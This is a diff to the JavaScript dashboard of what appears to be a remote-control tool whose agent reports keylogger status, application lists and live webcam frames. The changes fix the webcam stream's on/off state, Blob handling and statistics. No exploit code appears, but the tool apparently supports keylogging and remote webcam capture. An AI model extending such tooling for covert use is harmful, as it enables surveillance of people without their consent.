@@ -11,6 +11,8 @@ if (agentIdDisplay) agentIdDisplay.textContent = CONFIG.AGENT_ID;
 
 // --- 1. CÁC HÀM CALLBACK XỬ LÝ DỮ LIỆU (BẮT BUỘC PHẢI CÓ) ---
 
+const originalAttachViewListeners = window.attachViewListeners || function(){};
+
 function handleResponse(data) {
     if (!data) return;
 
@@ -27,14 +29,32 @@ function handleResponse(data) {
             const status = document.getElementById('keylogger-status');
             if(status) status.textContent = "Trạng thái: Đã dừng.";
         }
-        if(state.currentView === 'applications') sendCommand('app_list');
+        if(state.currentView === 'applications') {
+            sendCommand('app_list');
+            setTimeout(() => {
+                sendCommand('app_list');
+            }, 1000);
+        }
         
         // Reset Webcam UI
         if(state.currentView === 'webcam') {
+            // 1. Đặt cờ ngưng nhận dữ liệu
+            state.webcam.isStreaming = false;
+
             const vid = document.getElementById('webcam-stream');
             const ph = document.getElementById('webcam-placeholder');
             const stats = document.getElementById('webcam-stats-overlay');
-            if(vid) { vid.style.display = 'none'; vid.src = ""; }
+            
+            if(vid) { 
+                vid.style.display = 'none'; 
+                vid.src = ""; // Xóa dữ liệu ảnh cũ
+                
+                // Thu hồi Blob URL cũ ngay lập tức
+                if (previousObjectUrl) {
+                    URL.revokeObjectURL(previousObjectUrl);
+                    previousObjectUrl = null;
+                }
+            }
             if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt'; }
             if(stats) stats.style.display = 'none';
             state.webcam.currentFPS = 0;
@@ -83,9 +103,11 @@ function handleBinaryStream(imageData, frameSize = 0, senderTicks = 0) {
 
     // Xử lý Webcam
     if (view === 'webcam' && imageData) {
+        // QUAN TRỌNG: Kiểm tra cờ streaming. Nếu false thì bỏ qua gói tin này.
+        if (state.webcam.isStreaming === false) return;
+
         const cam = state.webcam;
         
-        // Tính toán FPS
         cam.framesReceived++;
         cam.totalDataReceived += frameSize;
         cam.currentFrameSize = frameSize;
@@ -99,7 +121,6 @@ function handleBinaryStream(imageData, frameSize = 0, senderTicks = 0) {
         }
         cam.lastFrameTime = nowPerf;
 
-        // Render ảnh Blob
         const video = document.getElementById('webcam-stream');
         const placeholder = document.getElementById('webcam-placeholder');
         
@@ -108,14 +129,14 @@ function handleBinaryStream(imageData, frameSize = 0, senderTicks = 0) {
             video.style.display = 'block';
 
             try {
-                // Convert Base64 sang Blob
-                const binaryString = atob(imageData); 
+                const base64Data = imageData.replace(/^data:image\/(png|jpeg|webp);base64,/, "");
+                const binaryString = atob(base64Data); 
                 const len = binaryString.length;
                 const bytes = new Uint8Array(len);
                 for (let i = 0; i < len; i++) {
                     bytes[i] = binaryString.charCodeAt(i);
                 }
-                const blob = new Blob([bytes], { type: "image/jpeg" });
+                const blob = new Blob([bytes], { type: "image/webp" });
 
                 if (previousObjectUrl) {
                     URL.revokeObjectURL(previousObjectUrl);
@@ -140,6 +161,7 @@ function updateWebcamStatsDisplay() {
         overlay.innerHTML = `
             <div class="text-sm font-mono text-white/90 p-2 space-y-0.5">
                 <p>FPS: <span class="font-bold text-green-400">${state.webcam.currentFPS.toFixed(1)}</span></p>
+                <p>Ping: <span class="font-bold text-green-400">${state.webcam.currentPing.toFixed(2)}</span></p>
                 <p>Rate: <span class="font-bold text-purple-400">${bitrateKBps.toFixed(1)} KB/s</span></p>
                 <p>Size: <span class="font-bold text-slate-300">${(state.webcam.currentFrameSize / 1024).toFixed(1)} KB</span></p>
             </div>`;
@@ -322,6 +344,8 @@ function attachViewListeners(view) {
     }
     else if (view === 'webcam') {
         document.getElementById('webcam-on-btn').onclick = () => {
+            // SỬA: Bật cờ streaming khi nhấn nút Bật
+            state.webcam.isStreaming = true;
             sendCommand('webcam_on');
             const ph = document.getElementById('webcam-placeholder');
             if(ph) ph.innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';
